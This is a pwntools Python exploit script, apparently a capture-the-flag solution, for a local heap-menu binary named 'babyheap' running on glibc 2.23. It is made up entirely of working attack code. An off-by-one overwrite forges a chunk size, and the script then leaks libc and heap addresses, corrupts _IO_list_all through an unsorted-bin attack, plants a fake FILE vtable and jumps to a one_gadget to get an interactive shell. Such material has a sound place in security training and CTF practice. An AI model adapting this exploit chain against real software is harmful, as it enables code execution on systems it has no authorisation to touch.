from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	pass

def menu(choice):
	p.sendlineafter("Command: ",str(choice))

def add(size):
	menu(1)
	p.sendlineafter("Size: ",str(size))
	#p.recvuntil("Allocated\n")

def edit(index,size,content):
	menu(2)
	p.sendlineafter("Index: ",str(index))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Content: ",content)
	p.recvuntil("Updated\n")

def free(index):
	menu(3)
	p.sendlineafter("Index: ",str(index))

def show(index):
	menu(4)
	p.sendlineafter("Index: ",str(index))

code_base = 0x555555554000
def debugf():
	if debug:
		#gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x11BB)))
		gdb.attach(p,"b __libc_message")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
size = 0x48
add(size) #0
add(size) #1
add(size) #2
add(size) #3
add(size) #4
add(size) #5
add(size) #6
add(size) #7
add(size - 0x20) #8
payload = "a" * size + "\xf1"
edit(0,size + 1,payload)
free(1)
add(size) #1
show(2)
p.recvuntil("Chunk[2]: ")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
#debugf()
add(size - 0x20) #9
free(8)
free(9)
show(2)
p.recvuntil("Chunk[2]: ")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
heap_base = leak_addr - 0x280
log.success("heap_base:" + hex(heap_base))
edit(4,size + 1,payload)
#debugf()
target = libc.symbols["_IO_list_all"] - 0x10
payload = p64(0)*4 + p64(0) + p64(0x61) + p64(target) + p64(target)
edit(2,len(payload),payload)
debugf()
payload = "b"*0x40 + p64(0)
edit(4,len(payload),payload)
vtable_addr = heap_base
payload = "b"*8 + p64(vtable_addr)
edit(5,len(payload),payload)
one_gadget = libc.address + 0xf1147
payload = p64(0) + p64(one_gadget)
edit(0,len(payload),payload)
add(0x10)
p.interactive()	
